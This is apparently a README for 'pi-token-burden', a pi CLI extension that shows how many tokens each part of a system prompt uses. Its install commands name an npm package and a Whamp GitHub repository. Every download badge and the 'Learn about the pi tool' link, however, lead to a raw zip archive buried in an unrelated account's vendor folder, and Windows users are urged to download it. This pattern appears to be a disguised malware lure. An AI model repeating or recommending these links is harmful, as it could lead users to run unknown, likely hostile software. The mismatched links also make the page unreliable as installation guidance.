# ⚙️ pi-token-burden - Track Your Prompt Token Usage Easily

[![Download pi-token-burden](https://img.shields.io/badge/Download-pi--token--burden-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip)

## 📌 What is pi-token-burden?

pi-token-burden helps you see how your system prompt uses tokens. When you work with AI that reads prompts, it counts tokens to manage context. This tool breaks down the tokens in your prompt into sections, so you know where the space goes. It works with the pi tool and shows:

- Tokens used by the base prompt  
- Tokens from AGENTS.md files  
- Tokens from skills  
- Tokens from SYSTEM.md overrides  
- Tokens from metadata  

This helps you understand your token limits and manage your prompts better.

## 🔎 How pi-token-burden Works

pi-token-burden is an add-on to pi, the command-line AI interface. When you run the command `/token-burden`, it analyzes the full system prompt. Then, it shows a clear list of how many tokens each part uses. This makes it easy to spot what takes up most space and adjust if needed.

You do not need any coding knowledge. The results appear right in your interface.

## 💻 System Requirements

To run pi-token-burden on Windows, your computer should have:

- Windows 10 or newer  
- At least 4 GB of RAM  
- Stable internet connection for initial setup  
- pi CLI tool installed (you will find setup details below)  

pi-token-burden works inside pi, so you must have that installed first.

## 🚀 Getting Started with pi-token-burden

### Step 1: Download pi-token-burden

Click on the badge below to visit the download page. This page has all the latest files and instructions:

[![Download here](https://img.shields.io/badge/Download-pi--token--burden-blue?style=for-the-badge)](https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip)

Once on the page, you will find files and instructions. The main file you want is the one for Windows.

### Step 2: Install pi CLI Tool

pi-token-burden depends on pi. To install pi on Windows:

1. Visit the official pi GitHub page or documentation to download the Windows installer.  
2. Follow the setup wizard and complete the installation.

If you have trouble, look for "pi Windows install" to find clear guides.

### Step 3: Install pi-token-burden

You can install pi-token-burden inside pi by typing a simple command:

- Open the Command Prompt (press Win + R, type `cmd`, hit Enter)
- Run this command:

```
pi install npm:pi-token-burden
```

This fetches the pi-token-burden extension and sets it up inside pi. If you prefer, you can install it directly from the GitHub repository with:

```
pi install git:github.com/Whamp/pi-token-burden
```

### Step 4: Run pi-token-burden

Once installed, open Command Prompt and start pi by typing:

```
pi
```

In the pi interface, type:

```
/token-burden
```

This command will analyze your current system prompt and show the token use breakdown by each section.

## 🔧 How to Use pi-token-burden

- Run the `/token-burden` command any time you want to see token usage.  
- Review the sections listed and check which parts use the most tokens.  
- Adjust your prompts or configuration files if token limits become a concern.  

This is useful when working with AI models that limit token counts, helping you avoid errors due to exceeding context window sizes.

## 📂 About the Files

pi-token-burden organizes tokens into categories based on files and metadata:

- **Base Prompt**: The main system prompt text  
- **AGENTS.md**: Any agent setup details in markdown files  
- **Skills**: Added AI skills that increase the token count  
- **SYSTEM.md**: Overrides that change system behavior  
- **Metadata**: Extra info stored with the prompt  

Each category is listed with exact token counts. This transparency helps manage prompt size clearly.

## ⚙️ Troubleshooting

If you cannot run pi or pi-token-burden:

- Ensure pi is installed and in your system Path environment variable.  
- Verify you are connected to the internet during installation.  
- Run Command Prompt as Administrator if you face permission issues.  
- Restart your computer if commands are not recognized.  
- Check the pi-token-burden GitHub issues page for known problems and fixes.

## 🛠 Manual Installation (Optional)

If you want to try pi-token-burden without installing, you can run it temporarily with this command:

```
pi -e npm:pi-token-burden
```

This downloads and runs the extension just for the current session.

## 🔗 Useful Links

- Visit the main pi-token-burden repository and download page here:  
  https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip

- Learn about the pi tool here:  
  https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip

## 🧩 Additional Tips

- Keep your prompts concise to save tokens.  
- Use pi-token-burden regularly to check how updates to agents and skills affect your token budget.  
- Adjust SYSTEM.md overrides carefully, as they may add unexpected tokens.

## 🖥 Interface Preview

The results from `/token-burden` appear as a simple list showing token counts for each section. This layout avoids confusion and uses plain numbers.

---

[![Open Download Page](https://img.shields.io/badge/Download-pi--token--burden-green?style=for-the-badge)](https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip)